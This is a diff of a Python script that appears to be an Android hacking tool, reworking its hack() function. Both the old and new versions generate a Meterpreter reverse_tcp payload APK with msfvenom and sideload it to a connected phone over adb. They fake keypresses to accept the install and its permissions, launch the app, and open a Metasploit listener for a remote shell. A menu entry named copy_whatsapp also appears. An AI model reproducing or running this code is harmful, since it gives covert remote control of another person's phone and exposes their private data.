@@ -321,52 +321,79 @@ def get_ip_address():
 
 
 def instructions():
+    '''Prints instructions for Metasploit and returns user's choice'''
     os.system(clear)
     print(banner.instructions_banner + banner.instruction)
-    input('> ')
+    choice = input('> ')
+    if choice == '':
+        return True
+    else:
+        return False
 
 
 def hack():
-    instructions()
-    os.system(clear)
-    print(banner.hacking_banner)
-    ip = get_ip_address()  # getting IP Address to create payload
-    print(f"\nUsing IP Address : {ip} to create payload\n")
-    print("\nCreating APK...\n")
-    # creating payload
-    os.system(
-        f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 > test.apk")
-    print("\nInstalling APK to target device...\n")
+    continue_hack = instructions()
+    if continue_hack:
+        os.system(clear)
+        print(banner.hacking_banner)
+        ip = get_ip_address()  # getting IP Address to create payload
+        lport = '4444'
+        print(
+            f"\n{color.CYAN}Using LHOST : {color.WHITE}{ip}{color.CYAN} & LPORT : {color.WHITE}{lport}{color.CYAN} to create payload\n{color.WHITE}")
 
-    # installing apk to device
-    if operating_system == 'Windows':
-        # (used 'start /b' to execute command in background)
-        os.system("start /b adb install test.apk")
+        choice = input(
+            f"\n{color.YELLOW}Press 'Enter' to continue OR enter 'M' to modify LHOST & LPORT > {color.WHITE}").lower()
+
+        if choice == 'm':
+            ip = input(f"\n{color.CYAN}Enter LHOST > {color.WHITE}")
+            lport = input(f"\n{color.CYAN}Enter LPORT > {color.WHITE}")
+        elif choice != '':
+            while choice != 'm' and choice != '':
+                choice = input(
+                    f"\n{color.RED}Invalid selection! , Press 'Enter' OR M > {color.WHITE}").lower()
+                if choice == 'm':
+                    ip = input(f"\n{color.CYAN}Enter LHOST > {color.WHITE}")
+                    lport = input(f"\n{color.CYAN}Enter LPORT > {color.WHITE}")
+
+        print(f"\n{color.CYAN}Creating payload APK...\n{color.WHITE}")
+        # creating payload
+        os.system(
+            f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lport} > test.apk")
+        print(f"\n{color.CYAN}Installing APK to target device...{color.WHITE}\n")
+
+        # installing apk to device
+        if operating_system == 'Windows':
+            # (used 'start /b' to execute command in background)
+            os.system("start /b adb install test.apk")
+        else:
+            # (used ' &' to execute command in background)
+            os.system("adb install test.apk &")
+        time.sleep(5)  # waiting for apk to be installed
+
+        # Keyboard input to accept app install
+        print(f"\n{color.CYAN}Accepting app install\n{color.WHITE}")
+        os.system('adb shell input keyevent 20')
+        os.system('adb shell input keyevent 20')
+        os.system('adb shell input keyevent 66')
+
+        print(f"\n{color.CYAN}Launching app...\n{color.WHITE}")
+        package_name = "com.metasploit.stage"  # payload package name
+        os.system("adb shell monkey -p " + package_name + " 1")
+        time.sleep(3)  # waiting for app to launch
+
+        # Keyboard input to accept app permissions
+        print(f"\n{color.CYAN}Accepting app permissions\n{color.WHITE}")
+        os.system('adb shell input keyevent 22')
+        os.system('adb shell input keyevent 22')
+        os.system('adb shell input keyevent 66')
+
+        # Launching Metasploit
+        print(
+            f"\n{color.RED}Launching and Setting up Metasploit-Framework\n{color.WHITE}")
+        os.system(
+            f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT {lport} ; exploit'")
     else:
-        # (used ' &' to execute command in background)
-        os.system("adb install test.apk &")
-    time.sleep(5)  # waiting for apk to be installed
-
-    # Keyboard input to accept app install
-    print("\nAccepting app install\n")
-    os.system('adb shell input keyevent 20')
-    os.system('adb shell input keyevent 20')
-    os.system('adb shell input keyevent 66')
-
-    print("\nLaunching app...\n")
-    package_name = "com.metasploit.stage"  # payload package name
-    os.system("adb shell monkey -p " + package_name + " 1")
-    time.sleep(3)  # waiting for app to launch
-
-    # Keyboard input to accept app permissions
-    print("\nAccepting app permissions\n")
-    os.system('adb shell input keyevent 22')
-    os.system('adb shell input keyevent 22')
-    os.system('adb shell input keyevent 66')
-
-    # Launching Metasploit
-    os.system(
-        f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT 4444 ; exploit ; help'")
+        print('\nGoing Back to Main Menu...\n')
 
 
 def copy_whatsapp():
